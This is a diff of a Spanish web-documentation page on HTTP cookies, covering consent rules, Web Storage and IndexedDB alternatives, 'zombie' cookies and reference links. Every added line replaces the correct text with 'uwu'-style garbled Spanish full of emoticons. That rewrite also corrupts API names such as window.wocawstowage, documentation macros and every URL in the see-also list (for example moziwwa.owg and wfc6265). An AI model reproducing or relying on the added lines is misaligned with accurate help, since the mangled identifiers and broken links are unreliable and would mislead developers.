+- n-nyotificaw a wos usuawios que ew sitio utiwiza c-cookies. (U ﹏ U)
+- pewmitiw a wos usuawios e-escogew n-nyo wecibiw awgunas o todas was c-cookies. (˘ω˘)
+- pewmitiw a-a wos usuawios u-utiwizaw wa mayow pawte dew sewvicio s-sin wecibiw c-cookies. /(^•ω•^)
 
-Puede haber otras regulaciones que rijan el uso de cookies en tu ubicación. La carga de conocer y cumplir estas regulaciones recae sobre usted. Hay empresas que ofrecen un código de "banner de cookies" que le ayuda a cumplir con estas normativas.
+puede habew otwas w-weguwaciones que wijan ew uso de c-cookies en tu ubicación. (U ﹏ U) w-wa cawga d-de conocew y cumpwiw estas weguwaciones w-wecae sobwe usted. ^•ﻌ•^ hay empwesas que o-ofwecen un código de "bannew de cookies" que we ayuda a cumpwiw con estas nyowmativas. >w<
 
-## Otras formas de almacenar información en el navegador
+## otwas fowmas de awmacenaw i-infowmación en ew nyavegadow
 
-Otro enfoque para almacenar datos en el navegador es la [API de almacenamiento web](/es/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Las propiedades [window.sessionStorage](/es/docs/Web/API/Window/sessionStorage) y [window.localStorage](/es/docs/Web/API/Window/localStorage) corresponden a cookies de sesión y permanentes en duración, pero tienen límites de almacenamiento mayores que las cookies y nunca se envían a un servidor. Se pueden almacenar cantidades de datos más estructuradas y mayores utilizando la [API IndexedDB](/es/docs/Web/API/IndexedDB_API) o una biblioteca construida sobre ella.
+otwo enfoque pawa awmacenaw datos en ew nyavegadow es wa [api de awmacenamiento w-web](/es/docs/web/api/web_stowage_api/using_the_web_stowage_api). ʘwʘ was pwopiedades [window.sessionstowage](/es/docs/web/api/window/sessionstowage) y [window.wocawstowage](/es/docs/web/api/window/wocawstowage) c-cowwesponden a cookies de sesión y-y pewmanentes en duwación, òωó pewo tienen wímites d-de awmacenamiento mayowes q-que was cookies y nyunca se envían a-a un sewvidow. o.O s-se pueden awmacenaw cantidades de datos más e-estwuctuwadas y mayowes utiwizando wa [api indexeddb](/es/docs/web/api/indexeddb_api) o una bibwioteca c-constwuida sobwe ewwa. ( ͡o ω ͡o )
 
-Existen algunas técnicas diseñadas para recrear las cookies después de eliminarlas. Se conocen como cookies "zombies". Estas técnicas violan los principios de privacidad y control del usuario, pueden violar las regulaciones de privacidad de datos y podrían exponer a un sitio web que las utilice a responsabilidad legal.
+e-existen awgunas técnicas diseñadas p-pawa wecweaw was cookies después d-de ewiminawwas. mya s-se conocen como cookies "zombies". >_< estas t-técnicas viowan wos pwincipios de pwivacidad y c-contwow dew usuawio, rawr pueden viowaw was weguwaciones de pwivacidad de datos y podwían e-exponew a u-un sitio web que was utiwice a w-wesponsabiwidad w-wegaw. >_<
 
-## Véase También
+## véase también
 
-- {{HTTPHeader("Set-Cookie")}}
-- {{HTTPHeader("Cookie")}}
-- {{domxref("Document.cookie")}}
-- {{domxref("Navigator.cookieEnabled")}}
-- [Inspeccionar cookies usando el Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html)
-- [Cookie specification: RFC 6265](https://tools.ietf.org/html/rfc6265)
-- [Nicholas Zakas article on cookies](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/)
-- [Nicholas Zakas article on cookies and security](https://www.nczonline.net/blog/2009/05/12/cookies-and-security/)
-- [HTTP cookies en Wikipedia](<https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica)>)
+- {{httpheadew("set-cookie")}}
+- {{httpheadew("cookie")}}
+- {{domxwef("document.cookie")}}
+- {{domxwef("navigatow.cookieenabwed")}}
+- [inspeccionaw c-cookies usando ew stowage inspectow](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw)
+- [cookie specification: wfc 6265](https://toows.ietf.owg/htmw/wfc6265)
+- [nichowas zakas a-awticwe on cookies](https://www.nczonwine.net/bwog/2009/05/05/http-cookies-expwained/)
+- [nichowas z-zakas awticwe on cookies and s-secuwity](https://www.nczonwine.net/bwog/2009/05/12/cookies-and-secuwity/)
+- [http c-cookies en wikipedia](<https://es.wikipedia.owg/wiki/cookie_(infowm%c3%a1tica)>)
